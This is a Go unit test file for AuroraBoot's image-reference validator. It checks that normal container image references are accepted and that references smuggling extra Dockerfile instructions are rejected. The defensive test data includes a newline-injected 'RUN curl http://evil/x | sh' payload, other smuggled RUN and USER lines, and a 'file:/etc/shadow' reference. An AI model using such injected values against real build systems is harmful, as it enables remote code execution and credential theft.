package imageref_test

import (
	"strings"
	"testing"

	"github.com/kairos-io/AuroraBoot/pkg/imageref"
)

// valid is every reference shape AuroraBoot is known to receive today: the
// UI's plain tags, the fully qualified ones in the e2e suite, digests, a
// registry with a port, the locally built tags the builder hands to itself,
// and the oci:/docker: source URIs the UKI path accepts.
var valid = []string{
	"ubuntu:24.04",
	"alpine:3.21",
	"alpine",
	"quay.io/kairos/ubuntu:24.04-core-amd64-generic-v3.6.0",
	"ghcr.io/kairos-io/hadron:v0.5.1",
	"quay.io/kairos/opensuse:leap-15.6-core-amd64-generic-v3.6.0",
	"quay.io/kairos/kairos-init:v4.3.0",
	"ubuntu@sha256:0000000000000000000000000000000000000000000000000000000000000000",
	"localhost:5000/kairos/ubuntu:24.04",
	"auroraboot-build:9a1c0f2e-0b7a-4a1e-9f1f-6f1f0d2b3c4d",
	"auroraboot-kairos:9a1c0f2e-0b7a-4a1e-9f1f-6f1f0d2b3c4d",
	"oci:quay.io/kairos/ubuntu:latest",
	"docker:quay.io/kairos/ubuntu:latest",
}

func TestValidateAcceptsEveryReferenceShapeInUse(t *testing.T) {
	t.Parallel()
	for _, v := range valid {
		if err := imageref.Validate("base image", v); err != nil {
			t.Errorf("expected %q to be accepted, got: %v", v, err)
		}
	}
}

func TestValidateAcceptsEmpty(t *testing.T) {
	t.Parallel()
	if err := imageref.Validate("base image", ""); err != nil {
		t.Errorf("empty must be the caller's business, got: %v", err)
	}
}

// The newline cases are the bug: each one is a reference that, spliced into
// `FROM %s`, turns one instruction into two.
func TestValidateRejectsInjectedInstructions(t *testing.T) {
	t.Parallel()
	injected := []string{
		"ubuntu:24.04\nRUN curl http://evil/x | sh",
		"ubuntu:24.04\r\nRUN id",
		"ubuntu:24.04\nUSER root",
		"ubuntu:24.04 AS stage\nFROM scratch",
		"ubuntu:24.04\x00",
		"ubuntu:24.04\tRUN id",
		"oci:quay.io/kairos/ubuntu:latest\nRUN id",
	}
	for _, v := range injected {
		err := imageref.Validate("base image", v)
		if err == nil {
			t.Errorf("expected %q to be rejected, but it was accepted", v)
			continue
		}
		if !strings.Contains(err.Error(), "base image") {
			t.Errorf("error for %q must name the field, got: %v", v, err)
		}
	}
}

func TestValidateRejectsUnparseableReferences(t *testing.T) {
	t.Parallel()
	bad := []string{
		"UPPERCASE/repo:tag",
		"ubuntu:",
		":tag",
		"ubuntu@sha256:nothex",
		// A server path is not an image, and the API already refuses
		// server-local sources for catalog extensions.
		"dir:/etc",
		"file:/etc/shadow",
	}
	for _, v := range bad {
		if err := imageref.Validate("base image", v); err == nil {
			t.Errorf("expected %q to be rejected, but it was accepted", v)
		}
	}
}

// NoControlChars is the render-time guard: it must not reject a shape it
// cannot parse, only one it cannot safely write.
func TestNoControlCharsOnlyLooksAtCharacters(t *testing.T) {
	t.Parallel()
	for _, v := range append([]string{"dir:/etc", "UPPERCASE/repo:tag", ""}, valid...) {
		if err := imageref.NoControlChars("f", v); err != nil {
			t.Errorf("expected %q to pass the render-time guard, got: %v", v, err)
		}
	}
	for _, v := range []string{"a\nb", "a b", "a\tb", "a\x00b", "a\x1bb"} {
		if err := imageref.NoControlChars("f", v); err == nil {
			t.Errorf("expected %q to be rejected by the render-time guard", v)
		}
	}
}
